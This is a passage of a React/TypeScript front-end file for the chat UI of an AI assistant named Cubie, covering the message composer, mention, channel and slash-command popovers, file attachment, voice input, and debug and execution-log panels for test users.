                                        title="Time elapsed while Cubie works on your request"
                                    >
                                        <Timer size={12} />
                                        {formatElapsed(elapsedSeconds)}
                                    </span>
                                </div>
                            </motion.div>
                        )}

                        <div ref={messagesEndRef} />
                    </div>
                </main>

                {/* Input Area */}
                <footer className="bg-white border-t border-gray-100 p-4 sticky bottom-0 z-50">
                    <div
                        className="max-w-4xl mx-auto relative"
                        onDragOver={(e) => {
                            if (!canAttach || !Array.from(e.dataTransfer.types).includes('Files')) return;
                            e.preventDefault();
                            setDragActive(true);
                        }}
                        onDragLeave={(e) => {
                            if (e.currentTarget.contains(e.relatedTarget as Node | null)) return;
                            setDragActive(false);
                        }}
                        onDrop={(e) => {
                            if (!canAttach || !e.dataTransfer.files?.length) return;
                            e.preventDefault();
                            setDragActive(false);
                            addFiles(Array.from(e.dataTransfer.files));
                        }}
                    >
                        {dragActive && (
                            <div className="absolute inset-0 z-40 rounded-xl border-2 border-dashed border-brand bg-white/90 flex items-center justify-center text-sm font-medium text-brand pointer-events-none">
                                Drop to attach. Only you will be able to see it.
                            </div>
                        )}
                        <ComposerAttachments items={pendingFiles} onRemove={removePending} />
                        {/* Mention Popover */}
                        <AnimatePresence>
                            {mentionQuery !== null && (
                                <motion.div 
                                    initial={{ opacity: 0, y: 10 }}
                                    animate={{ opacity: 1, y: 0 }}
                                    exit={{ opacity: 0, y: 10 }}
                                    className="absolute bottom-full left-0 mb-2 w-full md:w-[400px] bg-[#1e1e1e] border border-gray-800 rounded-xl shadow-2xl overflow-hidden z-50"
                                >
                                    <div className="px-4 py-2 bg-[#2a2a2a] border-b border-gray-800 text-xs font-semibold text-gray-400">
                                        Add people to chat
                                    </div>
                                    <div className="max-h-60 overflow-y-auto py-2">
                                        {isSearchingMention ? (
                                            <div className="px-4 py-3 text-sm text-gray-500">Searching directory...</div>
                                        ) : mentionError ? (
                                            <div className="px-4 py-3 text-sm text-amber-500/90">Couldn't reach the directory — try again</div>
                                        ) : mentionResults.length === 0 ? (
                                            <div className="px-4 py-3 text-sm text-gray-500">No matching users found</div>
                                        ) : (
                                            mentionResults.map((u, idx) => {
                                                const email = u.primaryEmail || u.emails?.[0]?.address;
                                                const name = u.name?.fullName || email;
                                                const initial = u.thumbnailPhotoUrl ? null : (u.name?.givenName?.[0] || email[0] || '?').toUpperCase();
                                                
                                                return (
                                                    <div 
                                                        key={u.id}
                                                        onClick={() => handleMentionSelect(u)}
                                                        onMouseEnter={() => setMentionIndex(idx)}
                                                        className={`px-4 py-3 flex items-center gap-3 cursor-pointer transition-colors ${idx === mentionIndex ? 'bg-[#333333]' : 'hover:bg-[#2a2a2a]'}`}
                                                    >
                                                        <div className="w-8 h-8 rounded-full bg-emerald-700 flex items-center justify-center text-white flex-shrink-0 text-xs font-bold overflow-hidden">
                                                            {u.thumbnailPhotoUrl ? <img src={u.thumbnailPhotoUrl} className="w-full h-full object-cover" alt="" /> : initial}
                                                        </div>
                                                        <div className="flex flex-col overflow-hidden">
                                                            <span className="text-gray-200 text-sm font-medium truncate">{name}</span>
                                                            <span className="text-gray-400 text-xs truncate">{email}</span>
                                                        </div>
                                                    </div>
                                                );
                                            })
                                        )}
                                    </div>
                                </motion.div>
                            )}
                        </AnimatePresence>

                        {/* Channel Popover (Slack #autocomplete) */}
                        <AnimatePresence>
                            {channelQuery !== null && (
                                <motion.div
                                    initial={{ opacity: 0, y: 10 }}
                                    animate={{ opacity: 1, y: 0 }}
                                    exit={{ opacity: 0, y: 10 }}
                                    className="absolute bottom-full left-0 mb-2 w-full md:w-[400px] bg-[#1e1e1e] border border-gray-800 rounded-xl shadow-2xl overflow-hidden z-50"
                                >
                                    <div className="px-4 py-2 bg-[#2a2a2a] border-b border-gray-800 text-xs font-semibold text-gray-400">
                                        Reference a Slack channel
                                    </div>
                                    <div className="max-h-60 overflow-y-auto py-2">
                                        {isSearchingChannel ? (
                                            <div className="px-4 py-3 text-sm text-gray-500">Searching channels…</div>
                                        ) : channelResults.length === 0 ? (
                                            <div className="px-4 py-3 text-sm text-gray-500">
                                                {channelQuery ? 'No matching channels' : 'Connect Slack in Settings to enable channel mentions'}
                                            </div>
                                        ) : (
                                            channelResults.map((c, idx) => (
                                                <div
                                                    key={c.id}
                                                    onClick={() => handleChannelSelect(c)}
                                                    onMouseEnter={() => setChannelIndex(idx)}
                                                    className={`px-4 py-2 flex items-center gap-2 cursor-pointer transition-colors ${idx === channelIndex ? 'bg-[#333333]' : 'hover:bg-[#2a2a2a]'}`}
                                                >
                                                    <span className="text-gray-500 text-sm font-mono">
                                                        {c.is_private ? '🔒' : '#'}
                                                    </span>
                                                    <span className="text-gray-200 text-sm font-medium truncate">
                                                        {c.name}
                                                    </span>
                                                </div>
                                            ))
                                        )}
                                    </div>
                                </motion.div>
                            )}
                        </AnimatePresence>

                        {/* "/" menu: the person's saved meeting skills and templates */}
                        <AnimatePresence>
                            {slashOpen && (
                                <motion.div
                                    initial={{ opacity: 0, y: 10 }}
                                    animate={{ opacity: 1, y: 0 }}
                                    exit={{ opacity: 0, y: 10 }}
                                    className="absolute bottom-full left-0 mb-2 w-full md:w-[460px] bg-[#1e1e1e] border border-gray-800 rounded-xl shadow-2xl overflow-hidden z-50"
                                >
                                    <div className="px-4 py-2 bg-[#2a2a2a] border-b border-gray-800 text-xs font-semibold text-gray-400">
                                        Run a saved skill or template
                                    </div>
                                    <div className="max-h-72 overflow-y-auto py-2">
                                        {slashMenu === null ? (
                                            <div className="px-4 py-3 text-sm text-gray-500">Loading…</div>
                                        ) : slashResults.length === 0 ? (
                                            <div className="px-4 py-3 text-sm text-gray-400">
                                                {slashQuery
                                                    ? `Nothing saved called “${slashQuery}”.`
                                                    : 'No saved skills or templates yet.'}{' '}
                                                Ask for a meeting in any shape, then say “save that as a skill”.
                                            </div>
                                        ) : (
                                            slashResults.map((entry, idx) => (
                                                <div
                                                    key={`${entry.kind}-${entry.slug}`}
                                                    onMouseDown={(e) => { e.preventDefault(); handleSlashSelect(entry); }}
                                                    onMouseEnter={() => setSlashIndex(idx)}
                                                    className={`px-4 py-2 cursor-pointer transition-colors ${idx === slashIndex ? 'bg-[#333333]' : 'hover:bg-[#2a2a2a]'}`}
                                                >
                                                    <div className="flex items-center gap-2">
                                                        <span className="text-gray-200 text-sm font-mono">/{entry.slug}</span>
                                                        <span className="text-[10px] uppercase tracking-wide text-gray-500 border border-gray-700 rounded px-1">
                                                            {entry.kind}
                                                        </span>
                                                    </div>
                                                    {entry.description && (
                                                        <div className="text-xs text-gray-400 truncate">{entry.description}</div>
                                                    )}
                                                </div>
                                            ))
                                        )}
                                    </div>
                                </motion.div>
                            )}
                        </AnimatePresence>

                        {/* Hover Card for Mentions */}
                        <AnimatePresence>
                            {hoveredMention && (
                                <motion.div
                                    initial={{ opacity: 0, scale: 0.95 }}
                                    animate={{ opacity: 1, scale: 1 }}
                                    exit={{ opacity: 0, scale: 0.95 }}
                                    transition={{ duration: 0.15 }}
                                    style={{
                                        position: 'fixed',
                                        left: Math.max(10, hoveredMention.rect.left + hoveredMention.rect.width / 2 - 150),
                                        top: Math.max(10, hoveredMention.rect.top - 140), // Show above the chip
                                        width: '300px',
                                        zIndex: 100
                                    }}
                                    className="bg-[#1e1e1e] border border-gray-800 rounded-xl shadow-2xl overflow-hidden pointer-events-none"
                                >
                                    <div className="p-4 flex items-center gap-4">
                                        <div className="w-16 h-16 rounded-2xl bg-gray-700 flex-shrink-0 overflow-hidden shadow-inner flex items-center justify-center">
                                            {hoveredMention.user.thumbnailPhotoUrl ? (
                                                <img src={hoveredMention.user.thumbnailPhotoUrl} className="w-full h-full object-cover" alt="Profile" />
                                            ) : (
                                                <span className="text-2xl font-bold text-gray-300">
                                                    {(hoveredMention.user.name?.givenName?.[0] || hoveredMention.user.primaryEmail[0]).toUpperCase()}
                                                </span>
                                            )}
                                        </div>
                                        <div>
                                            <div className="flex items-center gap-2">
                                                <h4 className="text-gray-100 font-bold text-lg">
                                                    {hoveredMention.user.name?.fullName || hoveredMention.user.primaryEmail}
                                                </h4>
                                                <div className="w-2 h-2 rounded-full bg-amber-500 shadow-[0_0_8px_rgba(245,158,11,0.5)]"></div>
                                            </div>
                                            <p className="text-gray-400 text-sm">{hoveredMention.user.organizations?.[0]?.title || 'Employee'}</p>
                                        </div>
                                    </div>
                                    <div className="bg-[#262626] border-t border-gray-800 px-4 py-3 flex items-center gap-2 text-sm text-gray-300">
                                        <svg className="w-4 h-4 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
                                        {new Date().toLocaleTimeString([], { hour: 'numeric', minute: '2-digit' })} local time
                                    </div>
                                </motion.div>
                            )}
                        </AnimatePresence>

                        <div data-tour="chat-composer" className="relative flex items-center gap-2">
                            <div
                                ref={inputRef}
                                // Always editable so the user can compose their
                                // next message while a response is in flight.
                                // Sending stays blocked during loading: the Send
                                // button is swapped for Stop and handleSend()
                                // early-returns while isLoading is true.
                                contentEditable
                                onInput={handleInput}
                                onKeyDown={handleKeyDown}
                                onPaste={(e) => {
                                    // A pasted screenshot attaches; pasted words stay words
                                    // (Word and Excel put a picture on the clipboard too).
                                    if (!canAttach) return;
                                    const files = Array.from(e.clipboardData?.files || []);
                                    if (files.length === 0) return;
                                    if ((e.clipboardData.getData('text/plain') || '').trim()) return;
                                    e.preventDefault();
                                    addFiles(files);
                                }}
                                onMouseMove={(e) => {
                                    const target = e.target as HTMLElement;
                                    const chip = target.closest('.mention-chip') as HTMLElement;
                                    if (chip && chip.dataset.mention === "true") {
                                        if (hoverTimeoutRef.current) {
                                            clearTimeout(hoverTimeoutRef.current);
                                            hoverTimeoutRef.current = null;
                                        }
                                        const user = JSON.parse(chip.dataset.user || '{}');
                                        const rect = chip.getBoundingClientRect();
                                        if (!hoveredMention || hoveredMention.user.id !== user.id) {
                                            setHoveredMention({ user, rect });
                                        }
                                    } else if (hoveredMention && !hoverTimeoutRef.current) {
                                        hoverTimeoutRef.current = setTimeout(() => {
                                            setHoveredMention(null);
                                            hoverTimeoutRef.current = null;
                                        }, 300);
                                    }
                                }}
                                onMouseLeave={() => {
                                    if (hoverTimeoutRef.current) clearTimeout(hoverTimeoutRef.current);
                                    hoverTimeoutRef.current = setTimeout(() => {
                                        setHoveredMention(null);
                                        hoverTimeoutRef.current = null;
                                    }, 300);
                                }}

                                className={`flex-1 bg-gray-50 border border-gray-200 text-gray-900 text-sm rounded-xl focus:outline-none focus:ring-2 focus:ring-brand focus:border-brand block w-full py-4 pl-5 ${canDictate && canAttach ? 'pr-48' : canDictate || canAttach ? 'pr-36' : 'pr-24'} shadow-sm transition-all min-h-[54px] max-h-[150px] overflow-y-auto`}

                                style={{ outline: 'none' }}
                                data-placeholder={canAttach ? 'Ask a question, attach a file, or type @ to mention...' : 'Ask a question or type @ to mention...'}
                            />
                            {/* CSS for empty placeholder */}
                            <style>{`
                                div[contenteditable]:empty:before {
                                    content: attr(data-placeholder);
                                    color: #9ca3af;
                                    pointer-events: none;
                                    display: block; /* For Firefox */
                                }
                            `}</style>
                            <div className="absolute right-2 top-1/2 -translate-y-1/2 flex items-center gap-1">
                                {/* Files in Ask Cubie: Word, PDF, Excel, PowerPoint, pictures */}
                                {canAttach && (
                                    <>
                                        <input
                                            ref={fileInputRef}
                                            type="file"
                                            multiple
                                            accept={ACCEPTED_FILE_TYPES}
                                            className="hidden"
                                            onChange={(e) => {
                                                const files = Array.from(e.target.files || []);
                                                e.target.value = '';
                                                addFiles(files);
                                            }}
                                        />
                                        <button
                                            data-tour="chat-attach"
                                            type="button"
                                            onClick={() => fileInputRef.current?.click()}
                                            className="p-2 rounded-lg text-gray-500 hover:text-brand hover:bg-brand/10 transition-colors"
                                            title="Attach a file: Word, PDF, Excel, PowerPoint or a picture. Only you can see it."
                                            aria-label="Attach a file"
                                        >
                                            <Paperclip size={18} />
                                        </button>
                                    </>
                                )}
                                {/* UAT-09: completion-sound toggle, docked beside Send */}
                                <button
                                    type="button"
                                    onClick={toggleChime}
                                    className={`p-2 rounded-lg transition-colors ${chimeEnabled ? 'text-brand hover:bg-brand/10' : 'text-gray-400 hover:bg-gray-100'}`}
                                    title={chimeEnabled
                                        ? 'Completion sound on — plays a chime when a long answer finishes. Click to mute.'
                                        : 'Completion sound off — click to play a chime when a long answer finishes.'}
                                    aria-label={chimeEnabled ? 'Mute completion sound' : 'Enable completion sound'}
                                    aria-pressed={chimeEnabled}
                                >
                                    {chimeEnabled ? <Volume2 size={18} /> : <VolumeX size={18} />}
                                </button>
                                {/* Voice input: speak, stop (button or Enter), and it sends */}
                                {canDictate && (
                                    <VoiceInputButton
                                        surface="chat"
                                        onTranscript={handleDictation}
                                        sendsOnStop
                                        keyScope={inputRef}
                                        keyClaimed={voiceKeyClaimed}
                                        onUserStop={handleVoiceStop}
                                        onBusyChange={handleVoiceBusy}
                                    />
                                )}
                                {isLoading ? (
                                    <button
                                        onClick={handleStop}
                                        aria-label="Stop generating"
                                        title="Stop"
                                        className="p-2.5 bg-brand hover:bg-brand-hover text-white rounded-lg transition-colors"
                                    >
                                        <Square size={18} fill="currentColor" />
                                    </button>
                                ) : (
                                    <button
                                        onClick={() => handleSend()}
                                        disabled={(!input.trim() && readyFileCount === 0) || voiceBusy || filesReading}
                                        title={voiceBusy ? 'The mic is on: stop it to send' : filesReading ? 'Cubie is still reading your file' : undefined}
                                        aria-label="Send message"
                                        className="p-2.5 bg-brand hover:bg-brand-hover text-white rounded-lg transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
                                    >
                                        <Send size={18} />
                                    </button>
                                )}
                            </div>
                        </div>
                        <div className="text-center mt-2">
                            <p className="text-xs text-gray-400">Cubie can make mistakes. Check important info.</p>
                        </div>
                    </div>
                </footer>

                {/* Side Panel */}
                <AnimatePresence>
                    {canSeeDebug && isLogPanelOpen && (
                        <>
                            {/* Backdrop for mobile */}
                            <motion.div
                                initial={{ opacity: 0 }}
                                animate={{ opacity: 0.3 }}
                                exit={{ opacity: 0 }}
                                onClick={() => setIsLogPanelOpen(false)}
                                className="fixed inset-0 bg-black z-40 lg:hidden"
                            />
                            <motion.div
                                initial={{ x: '100%' }}
                                animate={{ x: 0 }}
                                exit={{ x: '100%' }}
                                transition={{ type: 'spring', damping: 25, stiffness: 200 }}
                                className="fixed right-0 top-0 h-full w-full max-w-md bg-white shadow-2xl z-50 flex flex-col border-l border-gray-200"
                            >
                                <div className="flex items-center justify-between p-4 border-b border-gray-100 bg-gray-50">
                                    <h3 className="font-bold text-gray-800 flex items-center gap-2">
                                        <FileText size={18} className="text-brand" />
                                        Execution Logs
                                    </h3>
                                    <button
                                        onClick={() => setIsLogPanelOpen(false)}
                                        className="p-1 hover:bg-gray-200 rounded-full transition-colors"
                                    >
                                        <ChevronRight size={20} />
                                    </button>
                                </div>

                                <div className="flex-1 overflow-y-auto p-4 space-y-6">
                                    {selectedLogMessage ? (
                                        <>
                                            {selectedLogMessage.error_details && (
                                                <section>
                                                    <h4 className="text-xs font-bold text-red-600 uppercase tracking-widest mb-2">Error Details</h4>
                                                    <div className="bg-red-50 border border-red-100 p-3 rounded-lg text-xs font-mono text-red-800 whitespace-pre-wrap">
                                                        {selectedLogMessage.error_details}
                                                    </div>
                                                </section>
                                            )}

                                            {selectedLogMessage.generated_sql && (
                                                <section>
                                                    <h4 className="text-xs font-bold text-gray-400 uppercase tracking-widest mb-2">Generated SQL</h4>
                                                    <div className="bg-gray-900 text-gray-100 p-4 rounded-lg text-xs font-mono overflow-x-auto">
                                                        <pre>{selectedLogMessage.generated_sql}</pre>
                                                    </div>
                                                </section>
                                            )}

                                            {selectedLogMessage.hubspot_data && (
                                                <section>
                                                    <h4 className="text-xs font-bold text-gray-400 uppercase tracking-widest mb-2">CRM Context Retrieved</h4>
                                                    <div className="bg-brand-tint border border-brand/20 p-3 rounded-lg text-xs text-brand whitespace-pre-wrap leading-relaxed">
                                                        {selectedLogMessage.hubspot_data}
                                                    </div>
                                                </section>
                                            )}

                                            {selectedLogMessage.debug && (
                                                <section>
                                                    <h4 className="text-xs font-bold text-gray-400 uppercase tracking-widest mb-2">Retrieval Metadata</h4>
                                                    {selectedLogMessage.debug.request_id && (
                                                        <div className="mb-2 px-2 py-1 bg-gray-100 rounded text-[10px] font-mono text-gray-600">
                                                            Request ID: {selectedLogMessage.debug.request_id}
                                                            {selectedLogMessage.debug.total_duration_ms != null && (
                                                                <span className="ml-2">| Duration: {selectedLogMessage.debug.total_duration_ms}ms</span>
                                                            )}
                                                            {selectedLogMessage.debug.exec_ms != null && (
                                                                <span className="ml-2">| Exec: {selectedLogMessage.debug.exec_ms}ms</span>
                                                            )}
                                                        </div>
                                                    )}
                                                    <div className="bg-white border border-gray-200 p-3 rounded-lg text-xs leading-relaxed overflow-x-auto">
                                                        <pre className="whitespace-pre-wrap font-mono text-[10px]">
                                                            {JSON.stringify(selectedLogMessage.debug, null, 2)}
                                                        </pre>
                                                    </div>
                                                </section>
                                            )}

                                            {!selectedLogMessage.generated_sql && !selectedLogMessage.hubspot_data && !selectedLogMessage.error_details && !selectedLogMessage.debug && (
                                                <div className="h-full flex flex-col items-center justify-center text-gray-400 opacity-60 py-20">
                                                    <FileText size={48} className="mb-4" />
                                                    <p className="text-sm">No internal logs for this message.</p>
                                                </div>
                                            )}
                                        </>
                                    ) : (
                                        <div className="h-full flex flex-col items-center justify-center text-gray-400 opacity-60">
                                            <Bot size={48} className="mb-4" />
                                            <p className="text-sm">Select a message log to view details.</p>
                                        </div>
                                    )}
                                </div>
                            </motion.div>
                        </>
                    )}
                </AnimatePresence>

                {/* Debug Stats Panel — allowlisted test users only */}
                {canSeeDebug && (
                    <DebugStatsPanel
                        messages={messages}
                        isOpen={isStatsOpen}
                        onToggle={() => setIsStatsOpen(o => !o)}
                    />
                )}
            </div>
        </div>
    );
};

// ─── Debug Stats Panel ───────────────────────────────────────────────────────

const DebugStatsPanel: React.FC<{ messages: Message[]; isOpen: boolean; onToggle: () => void }> = ({ messages, isOpen, onToggle }) => {
    const lastAssistant = [...messages].reverse().find(m => m.role === 'assistant');
    const debug = lastAssistant?.debug as Record<string, any> | undefined;

    // JS heap memory (Chrome only)
    const perf = (performance as any).memory;
    const heapMB = perf ? (perf.usedJSHeapSize / 1024 / 1024).toFixed(1) : null;

    const fmt = (v?: number | null, unit = 'ms') => (v != null ? `${v}${unit}` : '—');
    const fmtNum = (v?: number | null) => (v != null ? v.toLocaleString() : '—');

    const rows: [string, string][] = [
        ['Intent', debug?.intent ?? '—'],
        ['Exec', fmt(debug?.exec_ms)],
        ['Total', fmt(debug?.total_duration_ms)],
        ['Prompt tkn', fmtNum(debug?.prompt_tokens)],
        ['Compl. tkn', fmtNum(debug?.completion_tokens)],
        ['Total tkn', fmtNum(debug?.total_tokens)],
        ['JS Heap', heapMB ? `${heapMB} MB` : 'N/A'],
        ['Messages', String(messages.length)],
        ['Req ID', debug?.request_id ?? '—'],
    ];

    return (
        <div
            style={{
                position: 'fixed',
                bottom: '80px',
                right: '16px',
                zIndex: 60,
                fontFamily: 'monospace',
            }}
        >
            <AnimatePresence>
                {isOpen && (
                    <motion.div
                        initial={{ opacity: 0, scale: 0.9, y: 8 }}
                        animate={{ opacity: 1, scale: 1, y: 0 }}
                        exit={{ opacity: 0, scale: 0.9, y: 8 }}
                        transition={{ duration: 0.15 }}
                        style={{
                            marginBottom: '6px',
                            background: 'rgba(15, 15, 20, 0.92)',
                            backdropFilter: 'blur(8px)',
                            border: `1px solid ${getBrandColor('brand', 0.45)}`,
                            borderRadius: '10px',
                            padding: '10px 14px',
                            minWidth: '210px',
                            boxShadow: '0 8px 32px rgba(0,0,0,0.5)',
                        }}
                    >
                        <div style={{ color: getBrandColor('accent'), fontSize: '9px', fontWeight: 700, letterSpacing: '0.1em', textTransform: 'uppercase', marginBottom: '8px' }}>
                            🛠 Test User Stats
                        </div>
                        <table style={{ borderCollapse: 'collapse', width: '100%' }}>
                            <tbody>
                                {rows.map(([label, value]) => (
                                    <tr key={label}>
                                        <td style={{ color: '#6b7280', fontSize: '10px', paddingRight: '10px', paddingBottom: '3px', whiteSpace: 'nowrap' }}>{label}</td>
                                        <td style={{ color: '#e5e7eb', fontSize: '10px', paddingBottom: '3px', textAlign: 'right', maxWidth: '110px', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>{value}</td>
                                    </tr>
                                ))}
                            </tbody>
                        </table>
                    </motion.div>
                )}
            </AnimatePresence>

            {/* Toggle Button */}
            <div style={{ display: 'flex', justifyContent: 'flex-end' }}>
                <button
                    onClick={onToggle}
                    title={isOpen ? 'Close stats' : 'Open debug stats'}
                    style={{
                        background: isOpen ? getBrandColor('brand') : 'rgba(20,20,28,0.85)',
                        border: `1px solid ${getBrandColor('brand', 0.5)}`,
                        borderRadius: '8px',
                        color: isOpen ? '#fff' : '#9ca3af',
                        cursor: 'pointer',
                        fontSize: '14px',
                        padding: '5px 10px',
                        backdropFilter: 'blur(6px)',
                        transition: 'background 0.2s, color 0.2s',
                        lineHeight: 1,
                    }}
                >
                    🛠
                </button>
            </div>
        </div>
    );
};

